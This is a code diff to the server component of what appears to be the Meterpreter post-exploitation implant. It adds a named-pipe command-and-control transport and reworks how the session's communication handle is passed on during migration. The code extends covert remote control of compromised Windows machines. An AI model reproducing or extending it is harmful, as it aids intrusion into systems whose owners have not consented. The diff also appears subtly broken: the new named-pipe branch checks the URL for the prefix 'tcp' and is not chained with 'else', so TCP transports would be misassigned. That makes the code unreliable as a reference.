@@ -7,9 +7,8 @@
 
 #include "win/server_transport_winhttp.h"
 #include "win/server_transport_tcp.h"
+#include "win/server_transport_named_pipe.h"
 #include "../../common/packet_encryption.h"
-
-#define TRANSPORT_ID_OFFSET 22
 
 extern Command* extensionCommands;
 
@@ -114,6 +113,14 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 			*size = sizeof(MetsrvTransportTcp);
 		}
 		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon);
+	}
+	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
+	{
+		if (size)
+		{
+			*size = sizeof(MetsrvTransportNamedPipe);
+		}
+		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon);
 	}
 	else
 	{
@@ -246,9 +253,10 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	do
 	{
 		// extend memory appropriately
-		DWORD neededSize = t->type == METERPRETER_TRANSPORT_TCP ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+		DWORD neededSize = t->type == METERPRETER_TRANSPORT_TCP ? sizeof(MetsrvTransportTcp) : 
+			(t->type == METERPRETER_TRANSPORT_PIPE ? sizeof(MetsrvTransportNamedPipe) : sizeof(MetsrvTransportHttp));
 
-		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_TCP ? "TCP" : "HTTP/S", s);
+		dprintf("[CONFIG] Allocating %u bytes for transport, total of %u bytes", neededSize, s);
 
 		sess = (MetsrvSession*)realloc(sess, s + neededSize);
 
@@ -258,23 +266,29 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 		ZeroMemory(target, neededSize);
 		s += neededSize;
 
-		if (t->type == METERPRETER_TRANSPORT_TCP)
+		if (t == current && t->get_handle != NULL)
 		{
-			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
-			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
-			dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
-			dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
-			dprintf("[CONFIG] TCP URL: %S", ((MetsrvTransportTcp*)target)->common.url);
-
-			// if the current transport is TCP, copy the socket fd over so that migration can use it.
-			if (t == current)
-			{
-				sess->comms_fd = (DWORD)t->get_socket(t);
-			}
+			sess->comms_handle.handle = t->get_handle(t);
 		}
-		else
+
+		switch (t->type)
 		{
-			transport_write_http_config(t, (MetsrvTransportHttp*)target);
+			case METERPRETER_TRANSPORT_TCP:
+			{
+				transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
+				break;
+			}
+			case METERPRETER_TRANSPORT_PIPE:
+			{
+				transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe*)target);
+				break;
+			}
+			case METERPRETER_TRANSPORT_HTTP:
+			case METERPRETER_TRANSPORT_HTTPS:
+			{
+				transport_write_http_config(t, (MetsrvTransportHttp*)target);
+				break;
+			}
 		}
 
 		t = t->next_transport;
@@ -307,7 +321,7 @@ DWORD server_setup(MetsrvConfig* config)
 	DWORD res = 0;
 
 	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
-	dprintf("[SESSION] Comms Fd: %u", config->session.comms_fd);
+	dprintf("[SESSION] Comms handle: %u", config->session.comms_handle);
 	dprintf("[SESSION] Expiry: %u", config->session.expiry);
 
 	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
@@ -361,11 +375,9 @@ DWORD server_setup(MetsrvConfig* config)
 				break;
 			}
 
-			// the first transport should match the transport that we initially connected on.
-			// If it's TCP comms, we need to wire that up.
-			if (remote->transport->type == METERPRETER_TRANSPORT_TCP && config->session.comms_fd)
+			if (remote->transport->set_handle)
 			{
-				((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_fd;
+				remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
 			}
 
 			// Set up the transport creation function pointer
